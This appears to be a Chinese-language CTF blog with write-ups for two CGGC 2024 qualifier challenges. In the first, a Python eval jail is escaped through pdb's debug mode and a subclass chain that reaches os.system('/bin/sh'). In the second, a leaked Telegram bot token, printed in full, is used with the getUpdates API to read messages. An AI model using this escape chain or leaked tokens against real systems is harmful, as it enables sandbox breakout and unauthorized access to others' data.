---
title: CGGC 2024 Qual Writes up
published: 2024-11-05
tags: [CTF]
category: Cyber Security
draft: false
image: 'image.png'
---


# Misc

## breakjail

jail.py

```py
#!/usr/local/bin/python3
print(open(__file__).read())

flag = open('flag').read()
flag = "Got eaten by the cookie monster QQ"

inp = __import__("unicodedata").normalize("NFKC", input(">>> "))

if any([x in "._." for x in inp]) or inp.__len__() > 55:
    print('bad hacker')
else:
    eval(inp, {"__builtins__": {}}, {
         'breakpoint': __import__('GoodPdb').good_breakpoint})

print(flag)
```

GoodPdb.py

```py
import pdb

# patch from https://github.com/python/cpython/blob/ed24702bd0f9925908ce48584c31dfad732208b2/Lib/cmd.py#L98


class GoodPdb(pdb.Pdb):
    def cmdloop(self, intro=None):
        """Repeatedly issue a prompt, accept input, parse an initial prefix
        off the received input, and dispatch to action methods, passing them
        the remainder of the line as argument.

        """

        self.preloop()
        if self.use_rawinput and self.completekey:
            try:
                import readline
                self.old_completer = readline.get_completer()
                readline.set_completer(self.complete)
                if readline.backend == "editline":
                    if self.completekey == 'tab':
                        # libedit uses "^I" instead of "tab"
                        command_string = "bind ^I rl_complete"
                    else:
                        command_string = f"bind {self.completekey} rl_complete"
                else:
                    command_string = f"{self.completekey}: complete"
                readline.parse_and_bind(command_string)
            except ImportError:
                pass
        try:
            if intro is not None:
                self.intro = intro
            if self.intro:
                self.stdout.write(str(self.intro)+"\n")
            stop = None
            while not stop:
                if self.cmdqueue:
                    line = self.cmdqueue.pop(0)
                else:
                    if self.use_rawinput:
                        try:
                            """
                            no interactive!
                            """
                            # line = input(self.prompt)
                            line = "EOF"
                        except EOFError:
                            line = 'EOF'
                    else:
                        self.stdout.write(self.prompt)
                        self.stdout.flush()
                        line = self.stdin.readline()
                        if not len(line):
                            line = 'EOF'
                        else:
                            line = line.rstrip('\r\n')
                line = self.precmd(line)
                stop = self.onecmd(line)
                stop = self.postcmd(stop, line)
            self.postloop()
        finally:
            if self.use_rawinput and self.completekey:
                try:
                    import readline
                    readline.set_completer(self.old_completer)
                except ImportError:
                    pass

    def do_interact(self, arg):
        """
        no interactive!
        """
        pass


good_breakpoint = GoodPdb().set_trace

```

首先看到`GoodPdb.py`會發現他把互動模式都拔掉了，接著跑回去看題目題目提示 `python` 的版本是 `Python 3.14.0a1`，發現 https://www.youtube.com/watch?v=tCs6rWpI0IM 裡面介紹 `Python 3.14.0a1` 新增的 `pdb` 用法，所以就一樣畫葫蘆，先看看 `breakpoint` 裡面有哪些 `command` 可以用
```py
breakpoint(commands=['h'])
out:
EOF    
cl         
disable     
ignore    
n        
return  
u          
where
a      
clear      
display     
interact  
next     
retval  
unalias  
alias  
commands   
down        
j         
p        
run     
undisplay
args   
condition  
enable      
jump      
pp       
rv      
unt      
b      
cont       
exceptions  
l         
q        
s       
until    
break  
continue   
exit        
list      
quit     
source  
up       
bt     
d          
h           
ll        
r        
step    
w        
c      
debug      
help        
longlist  
restart  
tbreak  
whatis 
```

之後就跑去看 https://docs.python.org/zh-tw/3.14/library/functions.html#breakpoint 裡面有哪些 `command` 可以用，發現 `debug` 可以進去 `debug` 模式，

```py
breakpoint(commands=['debug'])
```

回頭看看 `jail.py` 會發現他把 `__builtin__` 都清空了，所以不能用內建函數，所以就開始串 `mro chain` 去拿到 `shell`


```python
((Pdb)) "".__class__.__bases__[0].__subclasses__()

[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frame'>, <class 'FrameLocalsProxy'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'int'>, <class 'map'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'zip'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class '_buffer_wrapper'>, <class 'Token.MISSING'>, <class 'coroutine_wrapper'>, <class 'generic_alias_iterator'>, <class 'items'>, <class 'keys'>, <class 'values'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'hamt'>, <class 'InstructionSequence'>, <class 'sys.legacy_event_handler'>, <class 'line_iterator'>, <class 'managedbuffer'>, <class 'memory_iterator'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'positions_iterator'>, <class 'str_ascii_iterator'>, <class 'types.UnionType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'typing.TypeAliasType'>, <class 'NoDefaultType'>, <class 'typing.Generic'>, <class 'typing.TypeVar'>, <class 'typing.TypeVarTuple'>, <class 'typing.ParamSpec'>, <class 'typing.ParamSpecArgs'>, <class 'typing.ParamSpecKwargs'>, <class '_typing._ConstEvaluator'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class '_frozen_importlib._WeakValueDictionary'>, <class '_frozen_importlib._BlockingOnManager'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._ThreadHandle'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class 'winreg.PyHKEY'>, <class '_io.IncrementalNewlineDecoder'>, <class 
'_io._BytesIOBuffer'>, <class '_io._IOBase'>, <class 'nt.ScandirIterator'>, <class 'nt.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, 
<class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_multibytecodec.MultibyteCodec'>, <class '_multibytecodec.MultibyteIncrementalEncoder'>, <class '_multibytecodec.MultibyteIncrementalDecoder'>, <class '_multibytecodec.MultibyteStreamReader'>, <class '_multibytecodec.MultibyteStreamWriter'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Buffer'>, <class 'collections.abc.Callable'>, <class '_winapi.Overlapped'>, <class 'os._wrap_close'>, <class 'os._AddedDllDirectory'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'unicodedata.UCD'>, <class 'ast.AST'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'enum.nonmember'>, <class 'enum.member'>, <class 'enum._not_given'>, <class 'enum._auto_null'>, <class 'enum.auto'>, <class 'enum._proto_member'>, <enum 'Enum'>, <class 'enum.verify'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class '_sre.SRE_Template'>, <class 're._parser.State'>, <class 're._parser.SubPattern'>, <class 're._parser.Tokenizer'>, <class 'itertools.accumulate'>, <class 'itertools.batched'>, <class 'itertools.chain'>, <class 'itertools.combinations'>, <class 'itertools.compress'>, <class 'itertools.count'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.filterfalse'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools.islice'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.starmap'>, <class 'itertools.takewhile'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'itertools.zip_longest'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class 'collections._deque_iterator'>, <class 'collections._deque_reverse_iterator'>, <class 'collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools._PlaceholderType'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 're.Scanner'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'ast.NodeVisitor'>, <class 'annotationlib.ForwardRef'>, <class 'annotationlib._Stringifier'>, <class 'dis._Unknown'>, <class 'dis.Formatter'>, <class 'dis.ArgResolver'>, <class 'dis.Bytecode'>, <class '_tokenize.TokenizerIter'>, <class 'tokenize.Untokenizer'>, <class '_weakrefset.WeakSet'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'cmd.Cmd'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'textwrap.TextWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'warnings.deprecated'>, <class '_colorize.ANSIColors'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback._ExceptionPrintContext'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, 
<class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'code.Quitter'>, <class 'glob._GlobberBase'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class 'signal.Signals'>, <class 'signal.Handlers'>, <class 'rlcompleter.Completer'>, <class 'pdb._ExecutableTarget'>]
```

發現有 `warnings.catch_warnings`，可以讓我們拿來 `call /bin/sh`

```py

().__class__.__bases__[0].__subclasses__()[258]()._module.__builtins__['__import__']('os').system('/bin/sh')

```

## Day31- 水落石出！真相大白的十一月預告信？

題目給了一個連結 https://ithelp.ithome.com.tw/users/20168875/ironman/7849
然後要我們去找 flag，找了那麼多篇，最後在 https://ithelp.ithome.com.tw/articles/10363058 發現他外洩了一個 bot token ```https://api.telegram.org/bot7580842046:AAEKmOz8n3C265m2_XSv8cGFbBHg7mcnbMM/sendPhoto```
接著在 https://ithelp.ithome.com.tw/articles/10275761?sc=iThomeR 這邊學到了 api 的其他用法 - `/getUpdates`
最後依樣畫葫蘆就可以拿到 flag ㄌ  

```
https://api.telegram.org/bot7580842046:AAEKmOz8n3C265m2_XSv8cGFbBHg7mcnbMM/getUpdates
```
